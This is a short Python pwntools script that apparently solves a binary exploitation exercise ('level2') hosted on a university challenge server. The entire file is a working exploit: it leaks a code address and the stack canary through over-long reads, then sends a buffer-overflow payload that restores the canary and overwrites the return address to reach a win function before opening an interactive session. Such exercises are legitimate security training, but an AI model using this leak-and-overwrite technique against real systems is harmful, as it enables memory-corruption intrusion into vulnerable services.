from pwn import *
context.log_level = "debug" 

port = 10006
rem = remote("kayle.snu.ac.kr", port)
# rem = process("./level2/problem/level2")
# gdb.attach(rem)

print(rem.recvline())

payload = b'A' * 0x20
rem.send(payload)
print(rem.recvuntil(payload))
win_addr = u64(rem.recvn(6) + b'\x00' * 2) +0xe9

payload = b'B' * 0x29
rem.send(payload)
print(rem.recvuntil(payload))
canary = u64(b'\x00' +rem.recvn(7))
print(hex(canary))

payload = b'C' * 0x28 + p64(canary) + b'D' * 0x8 + p64(win_addr+ 1)
print(rem.recvuntil(b'comment: '))
rem.send(payload)
print(rem.recvline())

pause(2)
rem.interactive()